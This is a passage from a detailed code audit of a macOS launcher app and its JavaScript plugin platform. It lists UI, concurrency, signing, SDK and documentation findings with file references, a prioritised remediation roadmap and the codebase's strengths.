- **Fix:** `NSAttributedString(markdown:)` (macOS 12+) into `detailTextView.textStorage`, or rename the prop to `text` and document it as plain.

### UI-2 · [High] Plugin list shows raw shortcut strings ("cmd+enter") as literal text instead of key caps
- **Where:** `screenshot: launcher-plugin.png`; `AppKitAdapters.swift:732` (`accessory ?? shortcut ?? ""`).
- **Issue:** Every plugin row's right edge reads literal `cmd+enter` in faint text — looks like debug output, jarring next to the footer's real ↩/⌘K `KeyCapView` chips, and repeats identically on all rows.
- **Fix:** Translate tokens (`cmd`→⌘, `enter`→⏎, `opt`→⌥…) and render in `KeyCapView` chips; suppress per-row shortcuts identical to the footer's primary.

### Medium / Low (UI)
- **UI-3 [Med]** Snapshot background fudge hides the real vibrant material from the graded screenshots (`AppKitAdapters.swift:562-565`) — caveat the sign-off.
- **UI-4 [Med]** Footer icon (`gutter-4`, center ≈25pt) and search magnifier (`gutter`, center ≈29.5pt) don't share the result-row icon centerline (≈29pt) — breaks the "shared gutter" promise (`AppKitAdapters.swift:875,274,712`).
- **UI-5 [Med]** Search query text starts right of the row titles — search field and list don't read as one aligned column.
- **UI-6 [Med]** `LauncherRowView` reuse cast (`makeView(...) as? LauncherRowView`) silently allocates on a miss; false "2× pre-rasterized" comment with dead `px`/`_ = px` (`AppKitAdapters.swift:590,746-752`) — HiDPI icons are soft (ties to PERF-1).
- **UI-7 [Low]** Empty-state cluster centered on the list-scroll center reads top-heavy; 32pt glyph is heavy for an empty state.
- **UI-8 [Low]** Asymmetric show (animated) vs hide (hard cut); full-bleed separators vs inset selection pill create a ragged right margin; `isEmphasized` override hardcodes selection emphasis; detail subtitle is permanently disabled dead scaffolding (`:385-386`).

---

## 9. macOS & Swift best practices

### MAC-1 · [High] `AppSearchProvider` mutable frecency shared across threads with no lock — a genuine data race
- **Where:** `Sources/VeeServices/AppSearch.swift:67,90,122-138`; `main.swift:164-186` runs `search` on a global queue while `recordLaunch` runs on main.
- **Issue:** `final class` with a mutable `launches` dictionary, no lock; `record` mutates while `score` iterates → heap-corruption-class race on a Swift `Dictionary`. The package-wide `.v5` mode (MAC-3) silences the compiler that would flag it.
- **Fix:** Guard with an `NSLock` (mirroring `InMemorySecretStore`) or confine to one queue.

### MAC-2 · [High] Capability/usage-string mismatch: `vee.calendar` is never wired, yet `NSCalendarsFullAccessUsageDescription` ships
- **Where:** `packaging/Info.plist:27-28`; `main.swift` wires no calendar provider (defaults to `EmptyCalendarProvider`); `requestFullAccessToEvents` is never called.
- **Issue:** App Review rejects a usage-description string for a capability never requested; conversely the advertised feature isn't implemented. No EventKit→`CalendarProviding` adapter exists.
- **Fix:** Either implement+wire the adapter and request access, or remove the string until the feature lands.

### MAC-3 · [High] No hardened runtime, no entitlements, ad-hoc-only signing with failure swallowed — distribution/notarization will fail
- **Where:** `scripts/package-app.sh:37-39` (`codesign --force --deep --sign - … || true`); no entitlements file; no notarization.
- **Issue:** Cannot be notarized/distributed (Gatekeeper blocks on any other Mac); deprecated `--deep`; `|| true` defeats `set -euo pipefail` so a signing failure reports success. Ties to SEC-5/SEC-6.
- **Fix:** Developer ID identity, `--options runtime`, `--entitlements`, inside-out nested signing, notarize/staple; remove `|| true`.

### Medium / Low (macOS/Swift)
- **MAC-4 [Med]** `DispatchClock.schedule/cancel` use unconditional `queue.sync`; a timer callback re-arming a timer (running under `instance.queue.sync`) re-enters the clock queue → classic A→B/B→A serial-queue deadlock risk (`PluginHost.swift:220-247`, `PluginInstance.swift:137-143`). Apply the same `DispatchSpecificKey` inline trick already used in `LoopbackTransport`/`runOnQueue`, or fire the clock directly onto the instance queue.
- **MAC-5 [Med]** `MainActor.assumeIsolated` in the Carbon hotkey handler (`main.swift:203`) *asserts* (traps on failure) rather than hops; relies on undocumented main-thread delivery from `RegisterEventHotKey`. Use `DispatchQueue.main.async { MainActor.assumeIsolated { … } }`.
- **MAC-6 [Med]** `EsbuildBundler.build` reads stderr fully before stdout before `waitUntilExit` — order-dependent pipe-buffer deadlock on large stdout (`Bridges.swift:347-389`). Read both pipes concurrently.
- **MAC-7 [Med]** Package-wide `.v5` language mode masks real races (MAC-1) rather than isolating the unsafe JSC boundary. Move VeeServices (almost no JSC/AppKit coupling) to `.v6` to recover race diagnostics where they're needed.
- **MAC-8 [Low]** `try?` swallows errors at user-visible boundaries (`main.swift:176` plugin activate does nothing on failure, no log; `AppCoordinator.swift:386`). Route to the log transport/stderr.
- **MAC-9 [Low]** Bare `fatalError()` with no message in `KeyCapView.init?(coder:)` (`AppKitAdapters.swift:817`); pervasive `unsafeBitCast(block, to: AnyObject.self)` where `JSValue(object:in:)` is the sanctioned idiom (well-contained, not a bug).

---

## 10. Plugin platform, SDK & build pipeline

### PLT-1 · [High] The `clipboard` bridge is fully implemented + tested in the host but entirely absent from the typed SDK
- **Where:** `plugins/packages/sdk/src/runtime.ts:120-169` (`VeeHost` has no `clipboard`) vs `JSBridge.swift:244-255` (host installs `vee.clipboard.{history,copy}`). Three samples (`clipboard`, `snippets`, `api`) hand-roll `declare const vee: { clipboard: … }` to compensate — which also defeats the SDK's `host()`-missing guard.
- **Fix:** Add `VeeClipboard` to `VeeHost` + a `clipboard()` accessor + `ClipboardItem` re-export; delete the `declare const vee` shadows.

### PLT-2 · [High] `RUNTIME.md` (the normative contract) is stale — claims only `http`+`storage` ship; the host wires 8 bridges
- **Where:** `plugins/RUNTIME.md:124` vs `JSBridge.installVee()` (`:194-311`), which installs `fs`/`keychain`/`clipboard`/`calendar`/`open`/`openApp` too.
- **Fix:** Document all wired bridges; drop the "Wave 2a will implement the host" future-tense framing.

### Medium / Low (platform & testing)
- **PLT-3 [Med]** The 5 new samples (`github/jira/meetings/snippets/api`) are tested only in `node:vm` with faked bridges — never in real JSC. `node:vm` won't catch JSC-specific issues like `jira`'s hand-rolled `base64Utf8` (JSC has no `btoa`). The 4 older plugins *do* get the real-JSC fixture proof. Add VeeEngineTests fixture cases for the new five (the fakes already exist).
- **PLT-4 [Med]** Several samples can't function in the shipped binary because their providers are no-op/deny defaults (ties to SEC-INERT / H1): `clipboard`/`snippets` (DenyingClipboard), `github`/`jira` (InMemory keychain + ungated open), `meetings` (EmptyCalendar).
- **PLT-5 [Med]** No global `fetch`/DOM/`btoa`/`atob`; correct, but the SDK/docs never state the constraint. Add a "Runtime environment & missing globals" section and a base64 helper.
- **PLT-6 [Low]** No scaffolding CLI, no manifest schema validation beyond "has an id," no author-facing stack symbolication (`.js.map` files exist but the host doesn't use them), hot-reload real-but-dormant, microtask drain is a pragmatic `evaluateScript("")` (honestly disclosed).

---

## 11. Testing & documentation honesty

The **library test rigor is genuinely excellent and real** (see Strengths). The honesty concerns are concentrated in the *newer* Phase B/C/D top-matter of `STATUS.md`, not the candid foundational audit beneath it.

### DOC-1 · [Med] "Runnable launcher" / "plugins proven end-to-end" overclaims the *plugin* path
- The engine loads+renders a plugin under test (real, strong). The *app* surfacing a plugin into the visible `NSTableView` is **unverified by automation** and, per ARCH-1/ARCH-2/SEC-INERT, **actually broken in the shipped wiring**. "The app loads all 3 plugins and runs crash-free" rests on a 5-second timeout-killed smoke run, not a test, and "crash-free" ≠ "functional."

### DOC-2 · [Med] Test-count claims are inconsistent and stale
- `STATUS.md` cites "136", "147", and "155" Swift tests in different sections; `MANUAL-VERIFY.md` says "146 Swift + 12 node." **Actual: 168 Swift (1 skipped), ~34 node.** Stop hard-coding counts in prose or regenerate them in one pass.

### DOC-3 · [Med] "8.6/10 Raycast-grade ship-bar" was graded on flat-background snapshots that hide the real vibrant material (UI-3), and doesn't account for raw-Markdown detail (UI-1) or literal shortcut strings (UI-2).

### DOC-4 · [Info] Where the docs are refreshingly honest
The original Wave-3 `STATUS.md` audit ("headless engine core with a thin, unverified GUI/OS skin — not yet a runnable launcher") and `MANUAL-VERIFY.md` (presentational ⌘K, missing back-to-root, silent plugins, in-process/no-crash-isolation, hotkey caveats) are candid and match the code. The build pipeline is reproducible and **fixture-vs-fresh-build drift is asserted by tests** (zero drift found across all 9 committed fixtures).

---

## 12. Prioritized remediation roadmap

### P0 — Make the product work & safe (blocks any real use)
1. **Reconnect the plugin pipeline** — ARCH-1 (retarget the coordinator per active plugin) + ARCH-2 (stop clobbering the host `onReceive`) + wire the real providers in `main.swift`. Add a non-snapshot test that activates a command and asserts the window renders. *(H1)*
2. **Close the bridge security holes before wiring real providers** — SEC-1/SEC-2 (gate `open`/`openApp`), SEC-3 (re-check allowlist on redirects — **live now**), SEC-4 (scheme/SSRF). *(H2)*
3. **Kill per-keystroke jank** — PERF-1 (icon cache) + PERF-2 (use `inPrepared:`) + PERF-3 (top-K, reload changed rows only). *(H3)*
4. **Fix the data race** — MAC-1 (lock `AppSearchProvider`).

### P1 — Make it usable, accessible & honest
5. Populate the menubar menu (UX-3 — there is no Quit today). 
6. Escape-to-root from a plugin + context-aware Esc (UX-1).
7. Accessibility labels on rows/search/footer + Reduce Motion (UX-2, UX-7).
8. Surface toasts/errors (UX-5); loading state on cold open (UX-6).
9. Render Markdown in the detail pane (UI-1); key-cap the row shortcuts (UI-2).
10. Reset coordinator `lastRevision` on plugin/command change (ARCH-3).
11. Reconcile/auto-generate doc claims & test counts (DOC-1/2/3); fix the false "2×" icon comment (UI-6).

### P2 — Harden, polish, evolve
12. Keychain `…ThisDeviceOnly` (SEC-6); file protection on disk writes (SEC-9); authenticated plugin identity (SEC-7).
13. Signing/entitlements/hardened-runtime/notarization (MAC-3); calendar usage-string vs implementation (MAC-2).
14. Unfreeze the contract to absorb `open`/`openApp` cleanly (ARCH-5); make `deactivate` quiesce (ARCH-6); clock re-entrancy (MAC-4).
15. Wire VeeCache behind `vee.storage`/`vee.http` (PERF-6); lazy plugin load (PERF-7); gate the loopback codec round-trip to DEBUG (PERF-4).
16. Add `clipboard` to the SDK (PLT-1); real-JSC tests for the 5 new plugins (PLT-3); update RUNTIME.md (PLT-2).
17. Full keyboard model: wrap-around, Page/Home/End, ⌘↩, ⌘1-9, a real ⌘K actions panel (UX-4, UX-8, UX-9); Dynamic Type & contrast settings (UX-10/11/12); gutter alignment (UI-4/5).

---

## 13. Strengths (genuine, verified)

- **RFC-6902 JSON-Patch is excellent** — real pointer escaping/validation, leading-zero rejection, **LIS-based minimal array moves**, an LCS general path (never whole-array replace), and an `apply(diff(a,b),a)==b` property test. The strongest target.
- **fzy-style fuzzy matcher is well-engineered** — flat reused `Scratch` buffers via `withUnsafeBufferPointer`, UInt32 scalar compare, `isSubsequence` pre-reject, exact-match short-circuit, traceback skipped when indices aren't needed. (The waste is the *un-wired* `PreparedCandidate` cache around it — PERF-2 — not the core.)
- **JSC memory discipline is disciplined, centralized, and *asserted*** — all `@convention(block)`s in one file, `[weak self]` never capturing `context`, stored callbacks as `JSManagedValue` with owner registration + teardown; `testNoLeakAfterReload`/`-Deactivate` assert both the instance **and** the `JSVirtualMachine` go `nil`.
- **Security-grade library tests** — capability-deny paths assert the backend is **never touched** (`requested.isEmpty`, `provider.calls == 0`) and that code `-32001` reaches JS; path-traversal escape, deny-all, and cross-namespace keychain isolation are all tested. Microtask-before-macrotask ordering is locked by deterministic (no-sleep) regressions.
- **Clean seam architecture** — every OS touch point (NSWorkspace/NSPasteboard/EKEventStore/Carbon/Keychain) sits behind a protocol with tested pure logic above and a thin adapter below; value types crossing seams are `Sendable`. Textbook testable-macOS design.
- **Real native projection for list/detail/empty** (not the old flat string), real full-color app icons with SF-Symbol fallback, accent-tinted UTF-16-safe match highlighting, selection-preservation-by-id across live patches, and a thoughtful center-anchored entrance animation.
- **Correct security primitives where they exist** — the capture-time clipboard privacy filter (concealed/transient/password-manager UTIs dropped before history), native-bound per-plugin keychain namespacing, default-deny capabilities with correct subdomain-suffix matching (no `evilgithub.com` bug), clean supply chain (no install scripts, `external:[]`), and a drift-guarded reproducible esbuild pipeline.
- **Modern AppKit idiom** — `NSWorkspace.openApplication` (not deprecated `launchApplication`), `.nonactivatingPanel`/`.canJoinAllSpaces`, `wantsUpdateLayer`/`updateLayer`, `LSUIElement` + `.accessory`.
- **The foundational STATUS audit and MANUAL-VERIFY are unusually honest** about the in-process reality and the GUI/OS gaps — the candor is a real asset; the overclaims are confined to the newer phase notes.

---

*End of audit. Finding IDs (SEC-/ARCH-/PERF-/UX-/UI-/MAC-/PLT-/DOC-) are stable references for the roadmap in §12.*
